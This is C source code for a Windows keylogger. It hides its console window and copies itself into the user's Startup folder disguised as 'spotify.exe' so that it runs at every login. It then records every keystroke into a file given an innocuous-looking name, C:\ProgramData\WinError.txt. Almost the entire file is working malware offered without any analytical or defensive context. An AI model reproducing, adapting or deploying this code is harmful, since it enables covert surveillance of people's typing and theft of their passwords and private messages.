#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>
#include <sys/stat.h>
#include <Lmcons.h>


/*
  Method gets the current path of the executable, gets the path of
  the autostart folder and writes a copy of itself into autostart
*/
void writeSelfToAutostart(char *argv[]) {
  //init variables
  char *path = argv[0];
  char username[50];
  int dircount = 0;
  int namelengthcount = 0;

  //initialize username var
  for(int i = 0; i<50;i++) {
    username[i] = ' ';
  }

  //go through the path and read the username out of it
  for(int i=0; path[i] != '\0'; i++) {
    //save username charlength
    if(dircount == 2) {
      if(path[i] != '\\') {
        username[namelengthcount] = path[i];
        namelengthcount++;
      }
    }
    //check for dir marker
    if(path[i] == '\\') {
      dircount++;
    }

    //break out if namelength read
    if (dircount == 3) {
       break;
    }
  }

  //copy path of destination into copy command
  int commandIndexCounter = 5;
  char command[300] = "copy ";
  for(int i=0; path[i] != '\0'; i++) {
    command[i+5] = path[i];
    commandIndexCounter++;
  }

  //write destination into copy command
  command[commandIndexCounter] = ' ';
  commandIndexCounter++;
  char text[] = "C:\\Users\\";
  for (int i=0; i<sizeof(text)-1;i++) {
    command[commandIndexCounter] = text[i];
    commandIndexCounter++;
  }
  //add username
  for (int i=0; i<sizeof(username)-1;i++) {
    if(username[i] != ' ') {
      command[commandIndexCounter] = username[i];
      commandIndexCounter++;
    }
  }

  //add path to startup folder
  char text1[] = "\\AppData\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\spotify.exe";
  for (int i=0; i<sizeof(text1)-1;i++) {
    command[commandIndexCounter] = text1[i];
    commandIndexCounter++;
  }

  //finaly excute the cmd command
  system(command);
}





int main(int argc, char *argv[]) {
  //hide console
  HWND hWnd;
  AllocConsole();
  hWnd = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(hWnd, 0);

// Secure existance by writing self to autostart
  writeSelfToAutostart(argv);

  char Key;
  FILE *file;

  //open file
  file = fopen("C:\\ProgramData\\WinError.txt", "a+");

  while (1) {
      Sleep(20); //sleep so that I dont use too much ressources
      for (Key = 8; Key <= 255; Key++) { //loop through ascii table
          if (GetAsyncKeyState(Key) == -32767) {
            fprintf(file, "%c",Key);
            fflush(file);
          }
      }
  }

  return 0;
}
